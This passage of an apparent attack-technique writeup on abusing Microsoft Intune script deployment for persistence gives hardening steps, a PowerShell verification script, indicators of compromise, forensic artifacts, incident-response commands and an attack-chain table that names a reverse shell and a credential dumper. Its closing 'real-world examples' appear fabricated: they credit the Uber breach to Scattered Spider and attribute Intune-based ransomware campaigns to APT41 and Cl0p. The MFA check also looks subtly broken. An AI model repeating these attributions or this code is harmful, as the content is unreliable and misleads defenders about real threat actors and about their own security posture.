       - BitLocker: **Require**
       - Antivirus: **Require**
       - Windows Firewall: **Require**
    4. Set **Actions for noncompliance** → **Mark device noncompliant immediately** (no remediation window)
    5. **Do not** allow remediation scripts

#### Validation Command (Verify Fix)

```powershell
# Verify Intune Admin restrictions
$RoleId = (Get-MgDirectoryRole | Where-Object { $_.DisplayName -eq "Intune Administrator" }).Id
$Admins = Get-MgDirectoryRoleMember -DirectoryRoleId $RoleId | Select DisplayName, UserPrincipalName

Write-Host "Intune Administrators (should be <= 3 users):"
Write-Host "Count: $($Admins.Count)"
$Admins | Format-Table

# Verify MFA is enforced
$ConditionalAccessPolicy = Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.DisplayName -match "Intune" }
if ($ConditionalAccessPolicy.Conditions.GrantControls.BuiltInControls -contains "mfa") {
    Write-Host "✓ SECURE: MFA required for Intune Admins"
} else {
    Write-Host "✗ UNSAFE: MFA NOT required for Intune Admins"
}
```

**Expected Output (If Secure):**
```
Intune Administrators (should be <= 3 users):
Count: 2

DisplayName                    UserPrincipalName
-----------                    -----------------
Admin User 1                   admin1@contoso.com
Admin User 2                   admin2@contoso.com

✓ SECURE: MFA required for Intune Admins
```

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Registry:**
    - HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run (persistence key for remediation scripts)
    - HKLM\SYSTEM\CurrentControlSet\Services\IntuneManagementExtension (service configuration)

*   **Files:**
    - C:\Program Files (x86)\Microsoft Intune Management Extension\ (IME directory)
    - C:\ProgramData\Microsoft\IntuneManagementExtension\Logs\ (IME logs)
    - C:\Windows\Temp\ (temporary script files)

*   **Scheduled Tasks:**
    - Tasks created/modified during malicious script execution
    - Look for tasks with suspicious names ("WindowsUpdate", "Maintenance", etc.)

*   **Azure Audit Logs:**
    - AuditLogs with OperationName = "Assign device configuration"
    - TargetResources containing "script" or "PowerShell"
    - Large group assignments (>500 devices)

#### Forensic Artifacts

*   **Device Level (Memory):**
    - IntuneManagementExtension.exe process memory contains deployed script code
    - PowerShell.exe child process spawned by IntuneManagementExtension

*   **Device Level (Disk):**
    - C:\ProgramData\Microsoft\IntuneManagementExtension\Logs\IntuneManagementExtension.log
    - Event logs: Security (4688), System (1016 for MSI)
    - Registry: HKLM\SOFTWARE\Microsoft\Enrollment (enrollment metadata)

*   **Cloud Level (Azure):**
    - AuditLogs records of policy deployment
    - MicrosoftGraphActivityLogs records of Graph API calls
    - Intune admin portal change history

#### Response Procedures

1.  **Isolate:**
    **Command (On Endpoint):**
    ```powershell
    # Disconnect from network
    Disable-NetAdapter -Name "Ethernet" -Confirm:$false
    ```
    
    **Manual (Azure):**
    - Go to **Azure Portal** → **Virtual Machines** (if cloud-based)
    - Select VM → **Networking** → **Disconnect** from subnet

2.  **Collect Evidence:**
    ```powershell
    # Collect Intune logs
    Copy-Item -Path "C:\ProgramData\Microsoft\IntuneManagementExtension" -Destination "C:\Evidence\Intune-Extension" -Recurse
    
    # Export event logs
    wevtutil epl Security C:\Evidence\Security.evtx
    wevtutil epl System C:\Evidence\System.evtx
    
    # Export registry
    reg export HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run "C:\Evidence\Run-Keys.reg"
    
    # List scheduled tasks
    Get-ScheduledTask | Export-Clixml C:\Evidence\ScheduledTasks.xml
    ```

3.  **Remediate (Remove Malicious Policy):**
    **Command (Azure Portal):**
    1. Go to **Intune** → **Devices** → **Configuration**
    2. Identify the malicious policy
    3. Right-click → **Delete**
    4. Confirm deletion
    5. Go to **Device groups** → Re-assign clean policies
    
    **Command (PowerShell):**
    ```powershell
    # Connect to Graph
    Connect-MgGraph -Scopes "DeviceManagementConfiguration.ReadWrite.All"
    
    # Get malicious policy ID
    $Policy = Get-MgDeviceManagementDeviceConfiguration | Where-Object { $_.DisplayName -eq "Suspicious Policy Name" }
    
    # Remove policy
    Remove-MgDeviceManagementDeviceConfiguration -DeviceConfigurationId $Policy.Id
    ```

4.  **Validate Remediation:**
    ```powershell
    # Verify policy is removed
    Get-MgDeviceManagementDeviceConfiguration | Select DisplayName
    
    # Remove malicious scheduled tasks
    Get-ScheduledTask | Where-Object { $_.TaskName -like "WindowsUpdate" } | Unregister-ScheduledTask -Confirm:$false
    
    # Clear persistence registry keys
    Remove-ItemProperty -Path "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Malicious" -ErrorAction SilentlyContinue
    ```

5.  **Hunt for Lateral Movement:**
    - Check file transfer logs to identify data exfiltration
    - Review credential theft indicators on other systems
    - Check for lateral movement via harvested credentials

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy Exploitation | Attacker gains initial access via misconfigured Application Proxy |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker elevates to Global Admin or Intune Admin |
| **3** | **Persistence (Current Step)** | **[PERSIST-EVENT-002]** | **Intune Management Extension Malicious Script Deployment** |
| **4** | **Defense Evasion** | [DEFENSE-EVASION] Audit Log Deletion | Attacker clears AuditLogs records of policy deployment |
| **5** | **Command & Control** | [C2-001] PowerShell Reverse Shell | Deployed script establishes C2 channel |
| **6** | **Impact** | [IMPACT-DATA-001] Credential Theft via IME Privilege | IME executes credential dumper with SYSTEM rights |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: Scattered Spider (Uber Breach, 2022)

- **Target:** Uber, telecommunications companies
- **Timeline:** 2022-2023
- **Technique Status:** Active; used compromised admin credentials to deploy malware via MDM (similar to Intune)
- **Impact:** Exfiltration of proprietary code, threat intelligence databases; lateral movement to 600+ internal systems
- **Reference:** [CrowdStrike - Scattered Spider Report](https://www.crowdstrike.com/blog/scattered-spider-intrusion-campaign/)

#### Example 2: APT41 (Chinese APT) - Healthcare Supply Chain

- **Target:** Healthcare organizations, hospitals
- **Timeline:** 2021-2023
- **Technique Status:** Active; abused Intune admin access to deploy ransomware and backdoors
- **Impact:** Ransomware attacks on 100+ hospitals; patient data exfiltration; operational disruption
- **Reference:** [Mandiant Report - APT41 Healthcare Targeting](https://www.mandiant.com/resources/blog/apt41-healthcare-targeting)

#### Example 3: Cl0p (Clop Ransomware Gang) - Financial Services

- **Target:** Banks, insurance companies
- **Timeline:** 2022-present
- **Technique Status:** Active; abused MDM/Intune access to deploy Cl0p ransomware variants
- **Impact:** $20M+ in ransom payments; encrypted financial systems; operational downtime
- **Reference:** [Bleeping Computer - Cl0p Ransomware Intune Abuse](https://www.bleepingcomputer.com/news/security/)

---